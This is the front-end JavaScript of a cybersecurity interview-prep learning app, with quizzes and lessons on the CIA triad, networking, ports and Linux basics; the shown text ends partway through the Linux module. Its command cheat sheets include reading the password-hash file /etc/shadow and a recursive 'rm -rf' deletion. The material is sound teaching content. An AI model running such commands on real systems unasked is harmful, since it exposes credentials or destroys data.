// ============================================
// KRATIKAL CYBERSECURITY INTERVIEW PREP
// Complete Learning Platform — app.js
// ============================================

// ---- MODULE DATA ----
const MODULES = [
  {
    id: 'mod1',
    title: 'Cybersecurity Fundamentals',
    icon: '🔐',
    time: '2 hrs',
    desc: 'CIA Triad, types of hackers, authentication vs authorization, and core security concepts.',
    content: () => renderModule1()
  },
  {
    id: 'mod2',
    title: 'Networking Essentials',
    icon: '🌐',
    time: '3 hrs',
    desc: 'OSI model, TCP/IP, DNS, ports, protocols, firewalls — everything you need.',
    content: () => renderModule2()
  },
  {
    id: 'mod3',
    title: 'Linux Fundamentals',
    icon: '🐧',
    time: '3 hrs',
    desc: 'Essential commands, file permissions, user management, and networking in Linux.',
    content: () => renderModule3()
  },
  {
    id: 'mod4',
    title: 'HTTP, Web & APIs',
    icon: '🌍',
    time: '2 hrs',
    desc: 'How the web works, HTTP methods, cookies, sessions, REST APIs, and auth mechanisms.',
    content: () => renderModule4()
  },
  {
    id: 'mod5',
    title: 'OWASP Top 10',
    icon: '📋',
    time: '3 hrs',
    desc: 'All 10 categories of web application security risks with examples and mitigations.',
    content: () => renderModule5()
  },
  {
    id: 'mod6',
    title: 'Attacks Deep Dive',
    icon: '⚔️',
    time: '4 hrs',
    desc: 'SQL Injection, XSS, CSRF, IDOR, SSRF — with login page case studies and attack flows.',
    content: () => renderModule6()
  },
  {
    id: 'mod7',
    title: 'Security Tools',
    icon: '🔧',
    time: '3 hrs',
    desc: 'Burp Suite, NMAP, Kali Linux, Wireshark, Nikto — hands-on tool knowledge.',
    content: () => renderModule7()
  },
  {
    id: 'mod8',
    title: 'VAPT & Reporting',
    icon: '📝',
    time: '2 hrs',
    desc: 'VAPT methodology, penetration testing phases, report writing, and compliance.',
    content: () => renderModule8()
  },
  {
    id: 'mod9',
    title: 'Interview Q&A Bank',
    icon: '🎯',
    time: '2 hrs',
    desc: '100+ interview questions with detailed answers, scenario-based and case studies.',
    content: () => renderModule9()
  }
];

// ---- STATE ----
let currentModule = 'dashboard';
let completedModules = JSON.parse(localStorage.getItem('cyberprep_completed') || '{}');

// ---- INIT ----
document.addEventListener('DOMContentLoaded', () => {
  buildSidebar();
  navigate(currentModule);
  setupMobile();
});

function setupMobile() {
  document.getElementById('hamburgerBtn').addEventListener('click', () => {
    document.getElementById('sidebar').classList.toggle('open');
    document.getElementById('sidebarOverlay').classList.toggle('show');
  });
  document.getElementById('sidebarOverlay').addEventListener('click', () => {
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('sidebarOverlay').classList.remove('show');
  });
}

// ---- SIDEBAR ----
function buildSidebar() {
  const nav = document.getElementById('sidebarNav');
  let html = `<div class="nav-module-title ${currentModule === 'dashboard' ? 'active' : ''}" data-module="dashboard" onclick="navigate('dashboard')">
    <span class="module-num">🏠</span><span>Dashboard</span>
  </div>`;
  MODULES.forEach((m, i) => {
    const isComplete = completedModules[m.id];
    const cls = currentModule === m.id ? 'active' : (isComplete ? 'completed' : '');
    html += `<div class="nav-module-title ${cls}" data-module="${m.id}" onclick="navigate('${m.id}')">
      <span class="module-num">${String(i + 1).padStart(2, '0')}</span>
      <span>${m.title}</span>
      <span class="module-time">${isComplete ? '✓' : m.time}</span>
    </div>`;
  });
  nav.innerHTML = html;
}

function updateProgress() {
  const total = MODULES.length;
  const done = Object.keys(completedModules).filter(k => completedModules[k]).length;
  const pct = Math.round((done / total) * 100);
  document.getElementById('progressPercent').textContent = pct + '%';
  document.getElementById('progressBar').style.width = pct + '%';
}

// ---- NAVIGATION ----
function navigate(moduleId) {
  currentModule = moduleId;
  const area = document.getElementById('contentArea');
  document.getElementById('sidebar').classList.remove('open');
  document.getElementById('sidebarOverlay').classList.remove('show');

  if (moduleId === 'dashboard') {
    document.getElementById('breadcrumbCurrent').textContent = 'Dashboard';
    area.innerHTML = renderDashboard();
  } else {
    const mod = MODULES.find(m => m.id === moduleId);
    document.getElementById('breadcrumbCurrent').textContent = mod.title;
    area.innerHTML = mod.content();
  }

  buildSidebar();
  updateProgress();
  window.scrollTo({ top: 0, behavior: 'smooth' });
  setupInteractions();
}

function goNextIncomplete() {
  const next = MODULES.find(m => !completedModules[m.id]);
  if (next) navigate(next.id);
  else navigate('mod9');
}

function markModuleComplete(id) {
  completedModules[id] = true;
  localStorage.setItem('cyberprep_completed', JSON.stringify(completedModules));
  updateProgress();
  buildSidebar();
}

function resetProgress() {
  if (confirm('Reset all progress?')) {
    completedModules = {};
    localStorage.removeItem('cyberprep_completed');
    navigate('dashboard');
  }
}

// ---- INTERACTIONS ----
function setupInteractions() {
  // Q&A toggles
  document.querySelectorAll('.qa-question').forEach(q => {
    q.addEventListener('click', () => {
      q.closest('.qa-block').classList.toggle('open');
    });
  });
  // Quiz options
  document.querySelectorAll('.quiz-option').forEach(opt => {
    opt.addEventListener('click', () => handleQuiz(opt));
  });
}

function handleQuiz(opt) {
  const container = opt.closest('.quiz-container');
  if (container.dataset.answered) return;
  container.dataset.answered = 'true';
  const correct = opt.dataset.correct === 'true';
  if (correct) {
    opt.classList.add('correct');
  } else {
    opt.classList.add('incorrect');
    container.querySelector('[data-correct="true"]').classList.add('correct');
  }
  const expl = container.querySelector('.quiz-explanation');
  if (expl) expl.classList.add('show');
}

// ---- HELPERS ----
function terminal(title, body) {
  return `<div class="terminal-block">
    <div class="terminal-header">
      <div class="terminal-dot red"></div>
      <div class="terminal-dot yellow"></div>
      <div class="terminal-dot green"></div>
      <span class="terminal-title">${title}</span>
    </div>
    <div class="terminal-body">${body}</div>
  </div>`;
}

function qa(num, question, answer) {
  return `<div class="qa-block">
    <div class="qa-question">
      <span class="q-badge">Q${num}</span>
      <span class="q-text">${question}</span>
      <span class="q-toggle">▾</span>
    </div>
    <div class="qa-answer">
      <div class="qa-answer-inner">${answer}</div>
    </div>
  </div>`;
}

function quiz(id, question, options, correctIdx, explanation) {
  const letters = ['A', 'B', 'C', 'D', 'E'];
  let html = `<div class="quiz-container" id="${id}">
    <div class="quiz-title">🧪 Quick Check</div>
    <div class="quiz-question-text">${question}</div>
    <div class="quiz-options">`;
  options.forEach((o, i) => {
    html += `<div class="quiz-option" data-correct="${i === correctIdx}">
      <span class="option-letter">${letters[i]}</span>
      <span>${o}</span>
    </div>`;
  });
  html += `</div>
    <div class="quiz-explanation">${explanation}</div>
  </div>`;
  return html;
}

function caseStudy(title, content) {
  return `<div class="case-study">
    <div class="case-badge">📎 Case Study</div>
    <h4>${title}</h4>
    ${content}
  </div>`;
}

function conceptCard(type, title, content) {
  return `<div class="concept-card ${type}">
    <div class="card-title">${title}</div>
    <div>${content}</div>
  </div>`;
}

function keyPoints(items) {
  return `<div class="key-points">
    <div class="kp-title">⚡ Key Points for Interview</div>
    <ul>${items.map(i => `<li>${i}</li>`).join('')}</ul>
  </div>`;
}

function practiceBox(links) {
  return `<div class="practice-links">
    <div class="practice-title">🔗 Practice Resources</div>
    ${links.map(l => `<a href="${l.url}" target="_blank" rel="noopener">→ ${l.text}</a>`).join('')}
  </div>`;
}

function moduleFooter(id, prevId, nextId) {
  const prevMod = MODULES.find(m => m.id === prevId);
  const nextMod = MODULES.find(m => m.id === nextId);
  return `
    <div class="mark-complete" onclick="markModuleComplete('${id}'); this.querySelector('input').checked = true;">
      <input type="checkbox" ${completedModules[id] ? 'checked' : ''}>
      <label>Mark this module as complete</label>
    </div>
    <div class="module-nav-footer">
      ${prevId ? `<button class="btn btn-secondary" onclick="navigate('${prevId}')">← ${prevMod.title}</button>` : '<div></div>'}
      ${nextId ? `<button class="btn btn-primary" onclick="navigate('${nextId}')">Next: ${nextMod.title} →</button>` : `<button class="btn btn-success" onclick="navigate('dashboard')">🎉 Back to Dashboard</button>`}
    </div>`;
}

// ---- DASHBOARD ----
function renderDashboard() {
  const total = MODULES.length;
  const done = Object.keys(completedModules).filter(k => completedModules[k]).length;
  const totalHours = 24;
  let cards = '';
  MODULES.forEach((m, i) => {
    const isDone = completedModules[m.id];
    cards += `<div class="module-card" onclick="navigate('${m.id}')">
      <div class="card-icon">${m.icon}</div>
      <h3>${String(i + 1).padStart(2, '0')}. ${m.title}</h3>
      <p>${m.desc}</p>
      <div class="card-meta">
        <span class="card-time">⏱ ${m.time}</span>
        <div class="card-progress">
          <div class="mini-bar"><div class="mini-bar-fill" style="width:${isDone ? 100 : 0}%"></div></div>
        </div>
      </div>
    </div>`;
  });

  return `
    <div class="dashboard-hero fade-in">
      <h1>Kratikal CyberSec Interview Prep</h1>
      <p>Your complete 24-hour crash course covering everything from networking basics to advanced penetration testing — tailored for the Kratikal VAPT Intern role.</p>
    </div>
    <div class="dashboard-stats stagger-children">
      <div class="stat-card cyan"><div class="stat-value">${total}</div><div class="stat-label">Modules</div></div>
      <div class="stat-card green"><div class="stat-value">${done}</div><div class="stat-label">Completed</div></div>
      <div class="stat-card purple"><div class="stat-value">${totalHours}h</div><div class="stat-label">Total Time</div></div>
      <div class="stat-card orange"><div class="stat-value">100+</div><div class="stat-label">Questions</div></div>
    </div>
    <div class="module-cards stagger-children">${cards}</div>`;
}


// ============ MODULE 1: Cybersecurity Fundamentals ============
function renderModule1() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 01 · 2 hrs</div>
    <h1>🔐 Cybersecurity Fundamentals</h1>
    <p class="module-desc">Master the core concepts that form the foundation of everything in cybersecurity. These are the first things interviewers will ask.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🎯</span> What is Cybersecurity?</h2>
    <p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These cyberattacks are usually aimed at accessing, changing, or destroying sensitive information, extorting money, or interrupting business processes.</p>
    ${conceptCard('highlight', '💡 Interview Answer', `<p>"Cybersecurity is the practice of protecting computer systems, networks, data, and programs from unauthorized access, attacks, damage, or theft. It encompasses technologies, processes, and practices designed to safeguard digital assets and ensure confidentiality, integrity, and availability of information."</p>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔺</span> The CIA Triad</h2>
    <p>The <strong>CIA Triad</strong> is the most fundamental model in cybersecurity. Every security measure exists to protect one or more of these three pillars:</p>

    <table class="comparison-table">
      <tr><th>Pillar</th><th>Meaning</th><th>Example Attack</th><th>Protection</th></tr>
      <tr><td><strong>Confidentiality</strong></td><td>Only authorized people can access data</td><td>Data breach, eavesdropping</td><td>Encryption, access control</td></tr>
      <tr><td><strong>Integrity</strong></td><td>Data is accurate and unaltered</td><td>Man-in-the-middle, tampering</td><td>Hashing, digital signatures</td></tr>
      <tr><td><strong>Availability</strong></td><td>Systems are accessible when needed</td><td>DDoS attacks, ransomware</td><td>Redundancy, backups, DDoS protection</td></tr>
    </table>

    ${quiz('q1', 'A DDoS attack primarily targets which element of the CIA Triad?',
      ['Confidentiality', 'Integrity', 'Availability', 'Authentication'],
      2, 'DDoS (Distributed Denial of Service) attacks flood systems with traffic to make them unavailable to legitimate users, directly attacking Availability.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🎭</span> Types of Hackers</h2>
    <table class="comparison-table">
      <tr><th>Type</th><th>Also Called</th><th>Intent</th></tr>
      <tr><td><strong>White Hat</strong></td><td>Ethical Hacker</td><td>Finds vulnerabilities legally with permission to improve security</td></tr>
      <tr><td><strong>Black Hat</strong></td><td>Cracker</td><td>Exploits vulnerabilities illegally for personal gain</td></tr>
      <tr><td><strong>Grey Hat</strong></td><td>—</td><td>Finds vulnerabilities without permission but without malicious intent</td></tr>
      <tr><td><strong>Script Kiddie</strong></td><td>—</td><td>Uses pre-made tools without understanding how they work</td></tr>
      <tr><td><strong>Hacktivist</strong></td><td>—</td><td>Hacks for political or social causes (e.g., Anonymous)</td></tr>
      <tr><td><strong>State-Sponsored</strong></td><td>APT Groups</td><td>Government-backed hackers for espionage/cyber warfare</td></tr>
    </table>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔑</span> Authentication vs Authorization</h2>
    <p>This is a <strong>very commonly asked interview question</strong>. Know the difference perfectly.</p>

    <table class="comparison-table">
      <tr><th>Aspect</th><th>Authentication (AuthN)</th><th>Authorization (AuthZ)</th></tr>
      <tr><td><strong>What</strong></td><td>Verifying WHO you are</td><td>Verifying WHAT you can do</td></tr>
      <tr><td><strong>When</strong></td><td>Happens FIRST</td><td>Happens AFTER authentication</td></tr>
      <tr><td><strong>How</strong></td><td>Password, biometrics, OTP, certificates</td><td>Roles, permissions, ACLs, policies</td></tr>
      <tr><td><strong>Example</strong></td><td>Logging in with username/password</td><td>Admin can delete users, normal user cannot</td></tr>
      <tr><td><strong>HTTP</strong></td><td>401 Unauthorized (not authenticated)</td><td>403 Forbidden (authenticated but no permission)</td></tr>
      <tr><td><strong>Analogy</strong></td><td>Showing your ID at the door</td><td>The VIP pass that lets you backstage</td></tr>
    </table>

    ${caseStudy('Login Page — Authentication Flow', `
      <p><strong>Scenario:</strong> A user visits <code>example.com/login</code></p>
      <ol>
        <li><strong>Authentication:</strong> User enters username "vaibhav" and password "Pass123". Server checks credentials against the database.</li>
        <li><strong>Session Created:</strong> Server creates a session token/JWT and sends it back as a cookie.</li>
        <li><strong>Authorization:</strong> When the user tries to access <code>/admin/dashboard</code>, the server checks if user "vaibhav" has the "admin" role. If not → <code>403 Forbidden</code>.</li>
      </ol>
      <p><strong>Attack Scenario:</strong> If the app only checks authentication but not authorization, a normal user could access <code>/admin/dashboard</code> by simply navigating to the URL. This is called <strong>Broken Access Control</strong> (OWASP #1).</p>
    `)}

    ${quiz('q2', 'A user successfully logs in but gets a 403 Forbidden error when trying to access /admin. This is a failure of:',
      ['Authentication', 'Authorization', 'Both', 'Neither — the system is working correctly'],
      3, 'The system IS working correctly! The user was authenticated (logged in successfully) and authorization correctly prevented them from accessing a resource they don\'t have permission for. A 403 is the expected behavior.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🏗️</span> Key Security Concepts</h2>

    <h3>Vulnerability vs Threat vs Risk vs Exploit</h3>
    <table class="comparison-table">
      <tr><th>Term</th><th>Definition</th><th>Example</th></tr>
      <tr><td><strong>Vulnerability</strong></td><td>A weakness in a system</td><td>Unpatched software, SQL injection flaw</td></tr>
      <tr><td><strong>Threat</strong></td><td>A potential cause of harm</td><td>A hacker, malware, insider threat</td></tr>
      <tr><td><strong>Exploit</strong></td><td>Code/method that takes advantage of a vulnerability</td><td>A script that exploits a buffer overflow</td></tr>
      <tr><td><strong>Risk</strong></td><td>Likelihood × Impact of a threat exploiting a vulnerability</td><td>High risk if the vulnerability is easy to exploit and data is sensitive</td></tr>
    </table>
    <p><strong>Formula:</strong> <code>Risk = Threat × Vulnerability × Impact</code></p>

    <h3>Encryption Types</h3>
    <table class="comparison-table">
      <tr><th>Type</th><th>How It Works</th><th>Examples</th><th>Use Case</th></tr>
      <tr><td><strong>Symmetric</strong></td><td>Same key for encrypt & decrypt</td><td>AES, DES, 3DES, Blowfish</td><td>Fast, bulk data encryption</td></tr>
      <tr><td><strong>Asymmetric</strong></td><td>Public key encrypts, Private key decrypts</td><td>RSA, ECC, Diffie-Hellman</td><td>Key exchange, digital signatures</td></tr>
    </table>

    <h3>Hashing vs Encryption</h3>
    <table class="comparison-table">
      <tr><th>Feature</th><th>Hashing</th><th>Encryption</th></tr>
      <tr><td>Reversible?</td><td>❌ No (one-way)</td><td>✅ Yes (with key)</td></tr>
      <tr><td>Output length</td><td>Fixed (e.g., 256-bit for SHA-256)</td><td>Variable (depends on input)</td></tr>
      <tr><td>Purpose</td><td>Verify integrity, store passwords</td><td>Protect data confidentiality</td></tr>
      <tr><td>Examples</td><td>MD5, SHA-1, SHA-256, bcrypt</td><td>AES, RSA</td></tr>
    </table>

    ${conceptCard('warning', '⚠️ Remember', `<p><strong>MD5 and SHA-1 are broken</strong> — they are vulnerable to collision attacks. Always use <strong>SHA-256</strong> or better. For passwords, use <strong>bcrypt</strong> or <strong>argon2</strong> (salted + slow hashing).</p>`)}

    <h3>Multi-Factor Authentication (MFA)</h3>
    <p>Uses two or more of these factors:</p>
    <ul>
      <li><strong>Something you know</strong> — Password, PIN</li>
      <li><strong>Something you have</strong> — Phone (OTP), hardware token</li>
      <li><strong>Something you are</strong> — Fingerprint, face recognition</li>
    </ul>
  </div>

  ${keyPoints([
    'CIA Triad — Confidentiality, Integrity, Availability — foundation of all security',
    'Authentication = who you are; Authorization = what you can do',
    'HTTP 401 = not authenticated; 403 = not authorized',
    'Risk = Threat × Vulnerability × Impact',
    'Hashing is one-way (passwords); Encryption is two-way (data protection)',
    'Always use SHA-256+ for hashing, bcrypt for passwords',
    'MFA adds extra security layers beyond just passwords'
  ])}

  ${moduleFooter('mod1', null, 'mod2')}`;
}


// ============ MODULE 2: Networking Essentials ============
function renderModule2() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 02 · 3 hrs</div>
    <h1>🌐 Networking Essentials</h1>
    <p class="module-desc">Networking is the backbone of cybersecurity. You MUST know these concepts — interviewers will test you on OSI, TCP/IP, ports, and protocols.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📚</span> OSI Model (7 Layers)</h2>
    <p>The OSI (Open Systems Interconnection) model describes how data flows through a network in 7 layers. <strong>Remember: "Please Do Not Throw Sausage Pizza Away"</strong></p>

    <table class="comparison-table">
      <tr><th>#</th><th>Layer</th><th>Function</th><th>Protocols</th><th>Devices</th></tr>
      <tr><td>7</td><td><strong>Application</strong></td><td>User interface, end-user services</td><td>HTTP, FTP, SMTP, DNS, SSH</td><td>—</td></tr>
      <tr><td>6</td><td><strong>Presentation</strong></td><td>Encryption, compression, translation</td><td>SSL/TLS, JPEG, ASCII</td><td>—</td></tr>
      <tr><td>5</td><td><strong>Session</strong></td><td>Manage sessions/connections</td><td>NetBIOS, RPC</td><td>—</td></tr>
      <tr><td>4</td><td><strong>Transport</strong></td><td>Reliable delivery, segmentation</td><td>TCP, UDP</td><td>—</td></tr>
      <tr><td>3</td><td><strong>Network</strong></td><td>Routing, IP addressing</td><td>IP, ICMP, ARP</td><td>Router</td></tr>
      <tr><td>2</td><td><strong>Data Link</strong></td><td>MAC addressing, frames</td><td>Ethernet, WiFi</td><td>Switch</td></tr>
      <tr><td>1</td><td><strong>Physical</strong></td><td>Physical transmission (cables, signals)</td><td>—</td><td>Hub, Cable</td></tr>
    </table>

    ${conceptCard('highlight', '💡 Interview Tip', `<p>When asked "At which layer does X work?": <strong>Firewall</strong> → Layer 3/4 (Network/Transport), <strong>WAF</strong> → Layer 7 (Application), <strong>Switch</strong> → Layer 2, <strong>Router</strong> → Layer 3.</p>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔄</span> TCP vs UDP</h2>
    <table class="comparison-table">
      <tr><th>Feature</th><th>TCP</th><th>UDP</th></tr>
      <tr><td>Connection</td><td>Connection-oriented (3-way handshake)</td><td>Connectionless</td></tr>
      <tr><td>Reliability</td><td>Guaranteed delivery, ordered</td><td>No guarantee, may be out of order</td></tr>
      <tr><td>Speed</td><td>Slower (overhead)</td><td>Faster (less overhead)</td></tr>
      <tr><td>Header Size</td><td>20 bytes</td><td>8 bytes</td></tr>
      <tr><td>Use Cases</td><td>HTTP, FTP, SSH, Email</td><td>DNS, streaming, VoIP, gaming</td></tr>
    </table>

    <h3>TCP 3-Way Handshake</h3>
    <div class="attack-flow">
      <div class="attack-step"><strong>Client</strong><br>SYN →</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>Server</strong><br>← SYN-ACK</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step"><strong>Client</strong><br>ACK →</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step" style="border-color:var(--accent-green)"><strong>Connection<br>Established</strong></div>
    </div>
    <p><strong>SYN Flood Attack:</strong> Attacker sends many SYN packets but never completes the handshake (no ACK), exhausting server resources. This is a type of DoS attack.</p>

    ${quiz('q3', 'Which protocol uses a 3-way handshake?',
      ['UDP', 'TCP', 'ICMP', 'ARP'],
      1, 'TCP uses SYN → SYN-ACK → ACK handshake to establish a reliable connection before data transfer.')}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🚪</span> Important Ports</h2>
    <p>You MUST memorize these for the interview:</p>
    <table class="comparison-table">
      <tr><th>Port</th><th>Service</th><th>Protocol</th><th>Notes</th></tr>
      <tr><td>20, 21</td><td>FTP</td><td>TCP</td><td>20=data, 21=control. Sends creds in plaintext!</td></tr>
      <tr><td>22</td><td>SSH</td><td>TCP</td><td>Secure remote access (encrypted)</td></tr>
      <tr><td>23</td><td>Telnet</td><td>TCP</td><td>Insecure remote access (plaintext) — never use</td></tr>
      <tr><td>25</td><td>SMTP</td><td>TCP</td><td>Send emails</td></tr>
      <tr><td>53</td><td>DNS</td><td>TCP/UDP</td><td>Domain name resolution</td></tr>
      <tr><td>80</td><td>HTTP</td><td>TCP</td><td>Unencrypted web traffic</td></tr>
      <tr><td>443</td><td>HTTPS</td><td>TCP</td><td>Encrypted web traffic (TLS)</td></tr>
      <tr><td>3306</td><td>MySQL</td><td>TCP</td><td>Database</td></tr>
      <tr><td>3389</td><td>RDP</td><td>TCP</td><td>Remote Desktop</td></tr>
      <tr><td>8080</td><td>HTTP Alt</td><td>TCP</td><td>Common proxy/dev server port</td></tr>
    </table>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📡</span> Key Protocols</h2>

    <h3>DNS (Domain Name System)</h3>
    <p>Translates domain names (google.com) to IP addresses (142.250.x.x). Uses port 53.</p>
    <div class="attack-flow">
      <div class="attack-step">User types<br>google.com</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">DNS Resolver<br>(ISP)</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">Root DNS<br>Server</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">.com TLD<br>Server</div>
      <div class="attack-arrow">→</div>
      <div class="attack-step">Google's DNS<br>→ IP returned</div>
    </div>
    <p><strong>DNS Attacks:</strong> DNS Spoofing/Cache Poisoning (redirect to fake site), DNS Tunneling (exfiltrate data through DNS queries).</p>

    <h3>ARP (Address Resolution Protocol)</h3>
    <p>Maps IP addresses to MAC addresses on a local network. <strong>ARP Spoofing</strong> allows an attacker to intercept traffic on a LAN by poisoning ARP tables (Man-in-the-Middle).</p>

    <h3>DHCP (Dynamic Host Configuration Protocol)</h3>
    <p>Automatically assigns IP addresses to devices. <strong>DHCP Starvation</strong> attack exhausts available IPs; <strong>Rogue DHCP</strong> provides malicious DNS/gateway settings.</p>

    <h3>ICMP (Internet Control Message Protocol)</h3>
    <p>Used by <code>ping</code> and <code>traceroute</code>. <strong>Ping of Death</strong> sends oversized ICMP packets to crash systems.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🔥</span> Firewalls, IDS & IPS</h2>
    <table class="comparison-table">
      <tr><th>Device</th><th>Function</th><th>Action</th></tr>
      <tr><td><strong>Firewall</strong></td><td>Filters traffic based on rules (IP, port, protocol)</td><td>Allow/Block</td></tr>
      <tr><td><strong>IDS</strong> (Intrusion Detection System)</td><td>Monitors and detects suspicious activity</td><td>Alert only (passive)</td></tr>
      <tr><td><strong>IPS</strong> (Intrusion Prevention System)</td><td>Monitors and actively blocks threats</td><td>Alert + Block (active)</td></tr>
      <tr><td><strong>WAF</strong> (Web Application Firewall)</td><td>Protects web apps from Layer 7 attacks (XSS, SQLi)</td><td>Filter HTTP traffic</td></tr>
    </table>

    ${conceptCard('warning', '⚠️ Common Interview Question', `<p><strong>"What is the difference between IDS and IPS?"</strong><br>IDS only <em>detects</em> and <em>alerts</em> — it's like a security camera. IPS <em>detects</em> and <em>blocks</em> — it's like a security guard. IDS is passive; IPS is active/inline.</p>`)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🏠</span> IP Addressing Basics</h2>
    <h3>Private vs Public IP</h3>
    <table class="comparison-table">
      <tr><th>Private Ranges</th><th>Class</th><th>Usage</th></tr>
      <tr><td>10.0.0.0 – 10.255.255.255</td><td>Class A</td><td>Large networks</td></tr>
      <tr><td>172.16.0.0 – 172.31.255.255</td><td>Class B</td><td>Medium networks</td></tr>
      <tr><td>192.168.0.0 – 192.168.255.255</td><td>Class C</td><td>Home/small networks</td></tr>
    </table>
    <p><strong>NAT (Network Address Translation)</strong> maps private IPs to a public IP for internet access.</p>
    <p><strong>Subnetting:</strong> Divides a network into smaller sub-networks. Know that <code>/24</code> = 255.255.255.0 = 254 usable hosts.</p>

    <h3>IPv4 vs IPv6</h3>
    <ul>
      <li><strong>IPv4:</strong> 32-bit, ~4.3 billion addresses, e.g., 192.168.1.1</li>
      <li><strong>IPv6:</strong> 128-bit, virtually unlimited, e.g., 2001:0db8::1</li>
    </ul>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">🖥️</span> VPN, Proxy & Reverse Proxy</h2>
    <table class="comparison-table">
      <tr><th>Technology</th><th>What it does</th><th>Security Relevance</th></tr>
      <tr><td><strong>VPN</strong></td><td>Encrypts all traffic between you and VPN server</td><td>Hides IP, encrypts data in transit</td></tr>
      <tr><td><strong>Proxy</strong></td><td>Intermediary for client requests (forward proxy)</td><td>Anonymity, content filtering</td></tr>
      <tr><td><strong>Reverse Proxy</strong></td><td>Sits in front of servers, handles incoming requests</td><td>Load balancing, WAF, DDoS protection</td></tr>
    </table>
  </div>

  ${keyPoints([
    'OSI has 7 layers — know which devices/protocols operate at each layer',
    'TCP is reliable (handshake); UDP is fast (no handshake)',
    'Memorize key ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 53 (DNS), 3306 (MySQL)',
    'DNS resolves domain names to IPs; vulnerable to spoofing',
    'IDS detects (passive), IPS prevents (active)',
    'WAF protects web apps specifically at Layer 7',
    'Private IPs: 10.x.x.x, 172.16-31.x.x, 192.168.x.x'
  ])}

  ${moduleFooter('mod2', 'mod1', 'mod3')}`;
}


// ============ MODULE 3: Linux Fundamentals ============
function renderModule3() {
  return `
  <div class="module-header fade-in">
    <div class="module-tag">Module 03 · 3 hrs</div>
    <h1>🐧 Linux Fundamentals</h1>
    <p class="module-desc">Linux is the OS of choice for cybersecurity. Kali Linux is built on Debian. You need to know basic commands, file permissions, and networking commands.</p>
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">📁</span> Linux File System</h2>
    <table class="comparison-table">
      <tr><th>Directory</th><th>Purpose</th></tr>
      <tr><td><code>/</code></td><td>Root directory — everything starts here</td></tr>
      <tr><td><code>/home</code></td><td>User home directories (e.g., /home/vaibhav)</td></tr>
      <tr><td><code>/root</code></td><td>Root user's home directory</td></tr>
      <tr><td><code>/etc</code></td><td>Configuration files (passwd, shadow, hosts)</td></tr>
      <tr><td><code>/var</code></td><td>Variable data (logs in /var/log)</td></tr>
      <tr><td><code>/tmp</code></td><td>Temporary files (cleared on reboot)</td></tr>
      <tr><td><code>/bin</code></td><td>Essential binaries (ls, cp, mv)</td></tr>
      <tr><td><code>/usr</code></td><td>User programs</td></tr>
      <tr><td><code>/opt</code></td><td>Optional/third-party software</td></tr>
    </table>

    ${conceptCard('danger', '🔴 Security Important Files', `
      <ul>
        <li><code>/etc/passwd</code> — User accounts (readable by all, NO passwords)</li>
        <li><code>/etc/shadow</code> — Password hashes (root access only)</li>
        <li><code>/etc/hosts</code> — Local DNS resolution</li>
        <li><code>/var/log/auth.log</code> — Authentication logs</li>
        <li><code>/var/log/syslog</code> — System logs</li>
      </ul>
    `)}
  </div>

  <div class="topic-section">
    <h2><span class="section-icon">⌨️</span> Essential Commands</h2>

    <h3>File & Directory Operations</h3>
    ${terminal('File Operations', `<span class="cmd">ls -la</span>           <span class="comment"># List all files with permissions, hidden files</span>
<span class="cmd">cd /path</span>          <span class="comment"># Change directory</span>
<span class="cmd">pwd</span>               <span class="comment"># Print current directory</span>
<span class="cmd">mkdir mydir</span>       <span class="comment"># Create directory</span>
<span class="cmd">touch file.txt</span>    <span class="comment"># Create empty file</span>
<span class="cmd">cp file1 file2</span>    <span class="comment"># Copy file</span>
<span class="cmd">mv file1 file2</span>    <span class="comment"># Move/rename file</span>
<span class="cmd">rm file.txt</span>       <span class="comment"># Delete file</span>
<span class="cmd">rm -rf dir/</span>       <span class="comment"># Delete directory recursively (DANGEROUS!)</span>
<span class="cmd">cat file.txt</span>      <span class="comment"># Display file contents</span>
<span class="cmd">head -n 10 file</span>   <span class="comment"># First 10 lines</span>
<span class="cmd">tail -n 10 file</span>   <span class="comment"># Last 10 lines</span>
<span class="cmd">grep "text" file</span>  <span class="comment"># Search for text in file</span>
<span class="cmd">find / -name "*.conf"</span>  <span class="comment"># Find files by name</span>
<span class="cmd">which nmap</span>        <span class="comment"># Find location of a command</span>
<span class="cmd">wc -l file.txt</span>    <span class="comment"># Count lines in file</span>`)}

    <h3>User Management</h3>
    ${terminal('User Commands', `<span class="cmd">whoami</span>            <span class="comment"># Current user</span>
<span class="cmd">id</span>                <span class="comment"># User ID, group ID, groups</span>
<span class="cmd">sudo command</span>      <span class="comment"># Run as root/superuser</span>
<span class="cmd">su - username</span>     <span class="comment"># Switch user</span>
<span class="cmd">adduser vaibhav</span>   <span class="comment"># Add new user</span>
<span class="cmd">passwd vaibhav</span>    <span class="comment"># Change password</span>
<span class="cmd">usermod -aG sudo vaibhav</span>  <span class="comment"># Add user to sudo group</span>
<span class="cmd">cat /etc/passwd</span>   <span class="comment"># View all users</span>
<span class="cmd">cat /etc/shadow</span>   <span class="comment"># View password hashes (need root)</span>`)}

    <h3>File Permissions</h3>
    ${terminal('Permissions', `<span class="comment"># Permission string: -rwxr-xr--</span>
<span class="comment"># - = file type (- file, d directory, l link)</span>
<span class="comment"># rwx = Owner (read, write, execute)</span>
<span class="comment"># r-x = Group (read, execute)</span>
<span class="comment"># r-- = Others (read only)</span>

<span class="comment"># Numeric: r=4, w=2, x=1</span>
